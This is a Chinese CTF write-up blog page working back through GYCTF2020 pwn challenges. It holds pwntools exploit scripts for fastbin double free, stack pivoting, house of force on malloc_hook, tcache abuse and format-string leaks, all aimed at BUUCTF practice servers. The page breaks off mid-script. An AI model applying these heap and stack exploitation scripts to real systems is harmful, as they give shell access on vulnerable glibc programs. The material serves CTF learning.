@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"1p0ch.github.io","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="⑧知道该说啥，几个月前的题目由于👴过于🌶🐓，当时一道都没有做，现在BUU遇到了，为了多水几篇🦟章，就把它单独列出来记录一下，顺便记录一下有啥之前不会的知识点.(由于👴是懒🐕，所以就做多少就记录多少了)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GYCTF2020复现">
+<meta property="og:url" content="https://1p0ch.github.io/2020/04/12/GYCTF%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="1p0ch">
+<meta property="og:description" content="⑧知道该说啥，几个月前的题目由于👴过于🌶🐓，当时一道都没有做，现在BUU遇到了，为了多水几篇🦟章，就把它单独列出来记录一下，顺便记录一下有啥之前不会的知识点.(由于👴是懒🐕，所以就做多少就记录多少了)">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-04-12T15:33:45.000Z">
+<meta property="article:modified_time" content="2020-04-12T15:49:10.291Z">
+<meta property="article:author" content="1p0ch">
+<meta property="article:tag" content="复现">
+<meta property="article:tag" content="GYCTF2020">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://1p0ch.github.io/2020/04/12/GYCTF%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>GYCTF2020复现 | 1p0ch</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">1p0ch</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-fw fa-link"></i>友链</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://1p0ch.github.io/2020/04/12/GYCTF%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="1p0ch">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="1p0ch">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          GYCTF2020复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-04-12 23:33:45 / 修改时间：23:49:10" itemprop="dateCreated datePublished" datetime="2020-04-12T23:33:45+08:00">2020-04-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>9.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>⑧知道该说啥，几个月前的题目由于👴过于🌶🐓，当时一道都没有做，现在BUU遇到了，为了多水几篇🦟章，就把它单独列出来记录一下，顺便记录一下有啥之前不会的知识点.(由于👴是懒🐕，所以就做多少就记录多少了)</p>
+<a id="more"></a> 
+<h3 id="gyctf-2020-some-thing-exceting"><a href="#gyctf-2020-some-thing-exceting" class="headerlink" title="gyctf_2020_some_thing_exceting"></a>gyctf_2020_some_thing_exceting</h3><p><strong>64位libc 2.23 堆题目 fastbin</strong><br>题目读入了flag，并且在位置上构造了0x60，所以这里使用fastbin attack。存在uaf，直接一套double free+show秒<br>注意为了绕过double free的检测，需要add 两个0x50的，同时最后放上0x10防止合并<br>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">#p&#x3D;process(&#39;.&#x2F;gyctf_2020_some_thing_exceting&#39;)</span><br><span class="line">p&#x3D;remote(&#39;node3.buuoj.cn&#39;,26397)</span><br><span class="line">#elf&#x3D;ELF(&#39;.&#x2F;gyctf_2020_some_thing_exceting&#39;)</span><br><span class="line">backdoor&#x3D;0x6020a0</span><br><span class="line">def add(size_1,size_2,content_1&#x3D;&#39;&#39;,content_2&#x3D;&#39;&#39;):</span><br><span class="line">	p.recvuntil(&#39;to do :&#39;)</span><br><span class="line">	p.sendline(&#39;1&#39;)</span><br><span class="line">	p.recvuntil(&quot;ba&#39;s length : &quot;)</span><br><span class="line">	p.sendline(str(size_1))</span><br><span class="line">	p.recvuntil(&quot;ba : &quot;)</span><br><span class="line">	p.sendline(content_1)</span><br><span class="line">	p.recvuntil(&quot;na&#39;s length : &quot;)</span><br><span class="line">	p.sendline(str(size_2))</span><br><span class="line">	p.recvuntil(&quot;na : &quot;)</span><br><span class="line">	p.sendline(content_2)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	p.recvuntil(&#39;to do :&#39;)</span><br><span class="line">	p.sendline(&#39;4&#39;)</span><br><span class="line">	p.recvuntil(&#39;project ID : &#39;)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">	p.recvuntil(&#39;to do :&#39;)</span><br><span class="line">	p.sendline(&#39;3&#39;)</span><br><span class="line">	p.recvuntil(&#39;Banana ID : &#39;)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x70,0x50)#0</span><br><span class="line">add(0x10,0x50)#1</span><br><span class="line">add(0x10,0x10)#2</span><br><span class="line">free(0)</span><br><span class="line">free(1)#avoid double free check</span><br><span class="line">free(0)</span><br><span class="line">payload&#x3D;p64(backdoor-0x8)</span><br><span class="line"></span><br><span class="line">#0&lt;-1&lt;-0</span><br><span class="line">add(0x60,0x50,&#39;&#39;,payload)#3</span><br><span class="line">#(backdoor-0x8)&lt;-0&lt;-1</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pause()</span><br><span class="line"></span><br><span class="line">add(0x60,0x50)#4</span><br><span class="line">add(0x60,0x50)#5</span><br><span class="line">add(0x60,0x50)#6</span><br><span class="line">show(6)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h3><p><strong>64位栈迁移</strong><br>最好用send指令栈迁移，这道题就是基础迁移到栈上进行，泄露libc，然后ret地址放上one_gadget,然后直接getshell<br>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">#p&#x3D;process(&#39;.&#x2F;gyctf_2020_borrowstack&#39;)</span><br><span class="line">p&#x3D;remote(&#39;node3.buuoj.cn&#39;,27000)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;gyctf_2020_borrowstack&#39;)</span><br><span class="line">bss&#x3D;0x601080+0xb0</span><br><span class="line">leave_ret&#x3D;0x400699</span><br><span class="line">call_puts&#x3D;0x40065B</span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">puts_plt&#x3D;elf.plt[&#39;puts&#39;]</span><br><span class="line">pop_rdi&#x3D;0x0400703</span><br><span class="line">main&#x3D;elf.symbols[&#39;main&#39;]</span><br><span class="line">p.recvuntil(&#39;want&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x60+p64(bss)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(&#39;now!&#39;)</span><br><span class="line">payload&#x3D;&#39;\x00&#39;*0xb8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">#注意这里的地址比bss端加了8位</span><br><span class="line">#should be puts_plt not call_puts</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr&#x3D;u64(p.recvuntil(&#39;\x7f&#39;)[1:8].ljust(8,&#39;\x00&#39;))</span><br><span class="line">print(puts_addr)</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line">base&#x3D;puts_addr-0x06f690</span><br><span class="line">one_gadget&#x3D;base+0x45216</span><br><span class="line">p.sendline(&#39;a&#39;*0x68 + p64(one_gadget))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf_2020_force"></a>gyctf_2020_force</h3><p><strong>64位libc2.23 house of force</strong><br>这里不管申请多大的堆，都会读入0x50大小，所以这里是一个堆溢出，可以借此修改topchunk的大小<br><strong>这里有一个很重要的关于泄露libc的知识：</strong><br>申请一个极大的chunk，程序就会调用mmap进行内存分配，分配下的地址是libc 的跟随地址<br>所以这里我们可以先申请一个0x100000的chunk 来泄露libc 的基址<br>随后修改topchunk，利用house of force 进行攻击修改malloc hook来getshell</p>
+<p>这里有一个非常奇怪的地方， <strong>一种在本地能成功，但是远程泄露就失败，还有一种本地远程都能泄露成功</strong> 。<br>对于getshell，可以用malloc hook改成system然后size改成bin sh地址，也可以用one gadget<br>但是开始的时候这里one gadget没有成功（后来发现原因是add的时候chunk没有对齐）<br>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">context.arch &#x3D; &#39;amd64&#39;</span><br><span class="line">#p&#x3D;process(&#39;.&#x2F;gyctf_2020_force&#39;)</span><br><span class="line">p&#x3D;remote(&#39;node3.buuoj.cn&#39;,25871)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;gyctf_2020_force&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc-2.23_64.so&#39;)</span><br><span class="line">def add(size,data):</span><br><span class="line">    p.recvuntil(&#39;2:puts&#39;)</span><br><span class="line">    p.sendline(&#39;1&#39;)</span><br><span class="line">    p.recvuntil(&#39;size&#39;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&#39;bin addr &#39;)</span><br><span class="line">    heap_addr&#x3D;int(p.recv(14),16)</span><br><span class="line">    p.recvuntil(&#39;content&#39;)</span><br><span class="line">    p.send(data)</span><br><span class="line">    return heap_addr</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">#this can be use in local not remote</span><br><span class="line">libc_heap&#x3D;add(0x100000,&#39;aa&#39;)</span><br><span class="line">libc_base&#x3D;libc_heap-0x4d2010</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">#this can use both remote and local</span><br><span class="line">libc_heap&#x3D;add(0x200000,&#39;aaaa&#39;)</span><br><span class="line">libc_base&#x3D;libc_heap+0x200ff0</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pause()</span><br><span class="line">#0x4d2010&#x3D;0x7f8cda933010-(0x7f8cda825b10-0x3c4b10)</span><br><span class="line">malloc_hook&#x3D;libc_base+0x3c4b10</span><br><span class="line">realloc_hook&#x3D;malloc_hook-0x8</span><br><span class="line">realloc&#x3D;libc_base+0x846c0</span><br><span class="line">one_gadget&#x3D;libc_base+0x4526a</span><br><span class="line">bin_sh&#x3D;libc_base+0x18cd57</span><br><span class="line">system&#x3D;libc_base+0X45390</span><br><span class="line">#onegadget is no use here because none of them is empty</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pause()</span><br><span class="line">payload&#x3D;p64(0)*5+p64(0xffffffffffffffff)</span><br><span class="line">heap_base&#x3D;add(0x20,payload)-0x10    #0x030</span><br><span class="line">print(hex(heap_base))</span><br><span class="line"></span><br><span class="line">#here use one_gadget this can success in local and remote# 使用one_gadget</span><br><span class="line">size&#x3D;malloc_hook-heap_base-0x50-0x10      #注意这里对齐-0x10而不是0x8，否则就会失败写不进去</span><br><span class="line">add(size,&#39;aa&#39;)</span><br><span class="line">add(0x20,&#39;a&#39;*8+p64(one_gadget)+p64(realloc+16))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pause()</span><br><span class="line">p.recvuntil(&#39;2:puts&#39;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.recvuntil(&#39;size&#39;)</span><br><span class="line">p.sendline(&#39;12&#39;)</span><br><span class="line">p.interactive()</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">#use malloc hook-&gt;system this can success in local and remote# 使用system</span><br><span class="line">size&#x3D;malloc_hook-heap_base-0x50</span><br><span class="line">add(size,&#39;aa&#39;)</span><br><span class="line">add(0x20,p64(system))</span><br><span class="line">p.recvuntil(&#39;2:puts&#39;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.recvuntil(&#39;size&#39;)</span><br><span class="line">p.sendline(str(bin_sh))</span><br><span class="line">#here is str not p64</span><br><span class="line">p.interactive()</span><br><span class="line">&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="gyctf-2020-signin"><a href="#gyctf-2020-signin" class="headerlink" title="gyctf_2020_signin"></a>gyctf_2020_signin</h3><p><strong>ubuntu18，有后门函数，只能add 16次，edit 1次，同时人为对doublefree进行了限制。</strong><br>后门函数条件是ptr不为空，这里利用tcache整理机制填充fd<br>后门函数有一个calloc，利用calloc从fastbins中取chunk会把其他chunk整理进入tcache中，进而修改fd指针，进入后门<br>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">#p&#x3D;process(&#39;.&#x2F;gyctf_2020_signin&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;gyctf_2020_signin&#39;)</span><br><span class="line">p&#x3D;remote(&#39;node3.buuoj.cn&#39;,25949)</span><br><span class="line">ptr&#x3D;0x4040C0</span><br><span class="line">def add(idx):</span><br><span class="line">	p.recvuntil(&#39;choice&#39;)</span><br><span class="line">	p.sendline(&#39;1&#39;)</span><br><span class="line">	p.recvuntil(&#39;idx?&#39;)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,value):</span><br><span class="line">	p.recvuntil(&#39;choice&#39;)</span><br><span class="line">	p.sendline(&#39;2&#39;)</span><br><span class="line">	p.recvuntil(&#39;idx?&#39;)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.sendline(value)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">	p.recvuntil(&#39;choice&#39;)</span><br><span class="line">	p.sendline(&#39;3&#39;)</span><br><span class="line">	p.recvuntil(&#39;idx?&#39;)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def backdoor():</span><br><span class="line">	p.recvuntil(&#39;choice&#39;)</span><br><span class="line">	p.sendline(&#39;6&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(9): #0-&gt;8</span><br><span class="line">	add(i)</span><br><span class="line">for i in range(9): #0-&gt;8</span><br><span class="line">	free(i)</span><br><span class="line">#tcache 7</span><br><span class="line">#fastbin 2 7-&gt;8 8 last</span><br><span class="line">add(9)   #tcache 6</span><br><span class="line">edit(8,p64(ptr-0x10))</span><br><span class="line">backdoor()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="gyctf-2020-some-thing-interesting"><a href="#gyctf-2020-some-thing-interesting" class="headerlink" title="gyctf_2020_some_thing_interesting"></a>gyctf_2020_some_thing_interesting</h3><p><strong>ubuntu16 64位堆题目，uaf，fastbin attack</strong><br>开始使用格式化字符串泄露pie偏移，进而泄露libc基址<br>输入：OreOOrereOOreO%12$p<br>输出：OreOOrereOOreO0x555555555680<br>stack：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ telescope 0x7fffffffddf0</span><br><span class="line">0000| 0x7fffffffddf0 --&gt; 0x555555555680 (push   r15)                      偏移为12</span><br><span class="line">0008| 0x7fffffffddf8 --&gt; 0x555549e0 </span><br><span class="line">0016| 0x7fffffffde00 --&gt; 0x555555756050 (&quot;OreOOrereOOreO%&quot;...)</span><br><span class="line">0024| 0x7fffffffde08 --&gt; 0x7633d16a9ed34800 </span><br><span class="line">0032| 0x7fffffffde10 --&gt; 0x555555555680 (push   r15)</span><br><span class="line">0040| 0x7fffffffde18 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)</span><br><span class="line">0048| 0x7fffffffde20 --&gt; 0x1 </span><br><span class="line">0056| 0x7fffffffde28 --&gt; 0x7fffffffdef8 --&gt; 0x0</span><br></pre></td></tr></table></figure>
+<p>可以确定在偏移为17处可以libc基址<br>所以本次输入：OreOOrereOOreO%12$p<br>输出：OreOOrereOOreO0x7ffff7a2d830<br>这个地址就是&lt;__libc_start_main+240&gt;，进而可以计算libc基址<br>接下来就是正常的 uaf结合fastbin attack在malloc_hook处利用one gadget来getshell，另外注意调整栈帧<br>这里比较只比较前0xe个，后边可以用来格式化字符串</p>
+<p>check函数的格式化字符串漏洞，可以用来泄露libc 基址</p>
+<p>free处的uaf漏洞</p>
+<p>exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">#p&#x3D;process(&#39;.&#x2F;gyctf_2020_some_thing_interesting&#39;)</span><br><span class="line">p&#x3D;remote(&#39;node3.buuoj.cn&#39;,26050)</span><br><span class="line">#elf&#x3D;ELF(&#39;.&#x2F;gyctf_2020_some_thing_interesting&#39;)</span><br><span class="line"></span><br><span class="line">def leak():</span><br><span class="line">	p.recvuntil(&#39;please:&#39;)</span><br><span class="line">	p.sendline(&#39;OreOOrereOOreO%17$p&#39;)</span><br><span class="line">	p.recvuntil(&#39;to do :&#39;)</span><br><span class="line">	p.sendline(&#39;0&#39;)</span><br><span class="line">	p.recvuntil(&quot;OreOOrereOOreO&quot;)</span><br><span class="line">	libc_start&#x3D;int(p.recv(14),16)-240</span><br><span class="line">	base&#x3D;libc_start-0x20740</span><br><span class="line">	print(hex(base))</span><br><span class="line">	return base</span><br><span class="line">def add(size_1,size_2,content_1&#x3D;&#39;&#39;,content_2&#x3D;&#39;&#39;):</span><br><span class="line">	p.recvuntil(&#39;to do :&#39;)</span><br><span class="line">	p.sendline(&#39;1&#39;)</span><br><span class="line">	p.recvuntil(&quot;O&#39;s length : 